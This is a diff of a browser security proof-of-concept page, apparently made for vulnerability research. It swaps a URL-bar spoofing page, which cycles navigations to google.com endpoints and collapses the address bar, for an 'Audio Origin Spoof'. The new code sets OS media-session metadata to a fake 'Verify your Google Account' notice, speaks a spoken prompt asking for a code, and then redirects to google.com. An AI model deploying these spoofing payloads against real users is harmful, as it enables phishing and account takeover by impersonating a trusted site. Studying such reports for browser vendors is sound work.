@@ -1,112 +1,14 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<title>KICAU MANIA</title>
-<style>
-*{-webkit-tap-highlight-color:transparent}
-body{font:15px/1.55 -apple-system,system-ui,sans-serif;margin:0;padding:16px 16px 0;background:#0b0b0f;color:#e8e8ef}
-h1{font-size:19px;margin:0 0 10px}
-.p{margin:10px 0;padding:12px 14px;border:1px solid #2a2a35;border-radius:12px;background:#14141c}
-.k{color:#8b8b9e;font-size:11px;text-transform:uppercase;letter-spacing:.07em;margin-bottom:3px}
-b{color:#7ee787}
-code{word-break:break-all;color:#ffa657;font:13px ui-monospace,Menlo,monospace}
-button{font:600 15px -apple-system,system-ui;width:100%;padding:14px;margin:6px 0;border:0;border-radius:12px;background:#2f81f7;color:#fff}
-.sp{height:160vh}
-</style>
-</head>
-<body>
-
-<h1>KICAU MANIA</h1>
-
-<div class="p">
-<div class="k">url bar menampilkan</div>
-<div><b id="t">www.google.com</b></div>
-</div>
-
-<div class="p">
-<div class="k">document.URL sebenarnya</div>
-<code id="u">-</code>
-</div>
-
-<div class="p">
-<div class="k">status</div>
-<div>commit ke-<b id="n">0</b> &middot; <span id="s">idle</span></div>
-<div class="k" style="margin-top:6px">viewport / bar</div>
-<div><span id="v">-</span></div>
-</div>
-
-<button id="a">ARM</button>
-<button id="b">ARM + collapse bar</button>
-
-<div class="sp"></div>
-
-<script>
-var ORIGIN = "https://www.google.com";
-
-var CARRIERS = [
-  ORIGIN + "/generate_204",
-  ORIGIN + "/gen_204?atyp=i",
-  ORIGIN + "/generate_204?x=1",
-  ORIGIN + "/csi?v=3&s=webhp"
-];
-
-var n = 0, i = 0, timer = null;
-
-function paint(href, state){
-  try{
-    document.getElementById("u").textContent = href;
-    document.getElementById("n").textContent = n;
-    document.getElementById("s").textContent = state;
-    document.getElementById("t").textContent = ORIGIN.replace("https://","");
-  }catch(e){}
-}
-
-function vp(){
-  try{
-    var w = window.visualViewport;
-    var h = w ? Math.round(w.height) : window.innerHeight;
-    document.getElementById("v").textContent =
-      h + "px / " + window.innerHeight + "px / y=" + Math.round(window.scrollY);
-  }catch(e){}
-}
-
-function commit(){
-  var href = "-";
-  try{ href = location.href; }catch(e){}
-  try{ location.href = CARRIERS[i++ % CARRIERS.length]; n++; }catch(e){}
-  paint(href, "armed");
-}
-
-function arm(){
-  if(timer){ clearInterval(timer); }
-  commit();
-  timer = setInterval(commit, 2200);
-}
-
-document.getElementById("a").onclick = function(){ arm(); };
-
-document.getElementById("b").onclick = function(){
-  window.scrollTo(0, 1);
-  setTimeout(function(){ window.scrollTo(0, 120); }, 60);
-  setTimeout(function(){ window.scrollTo(0, 260); }, 180);
-  setTimeout(arm, 320);
-};
-
-if(window.visualViewport){ window.visualViewport.addEventListener("resize", vp); }
-window.addEventListener("scroll", vp, {passive:true});
-setInterval(function(){
-  vp();
-  if(!timer){
-    var href = "-";
-    try{ href = location.href; }catch(e){}
-    paint(href, "idle");
-  }
-}, 500);
-vp();
-</script>
-
-</body>
-</html>
+<!doctype html><meta charset="utf-8"><title>Audio Origin Spoof - 2 mediasession metadata</title>
+<!-- OBSERVE: open the OS media hub / lockscreen (or chrome://media-internals).
+     Attacker-authored title + artist + artwork sit next to the google.com tab. -->
+<button onclick="
+  navigator.mediaSession.metadata = new MediaMetadata({
+    title:  'Verify your Google Account',
+    artist: 'google.com',
+    album:  'Security Notice',
+    artwork:[{src:'https://www.google.com/favicon.ico',sizes:'96x96',type:'image/x-icon'}]
+  });
+  const u = new SpeechSynthesisUtterance('Google security. Please confirm the code shown on your screen.');
+  u.rate = 0.9; speechSynthesis.speak(u);
+  setTimeout(() => { location.href = 'https://google.com'; }, 800);
+"> Test </button>
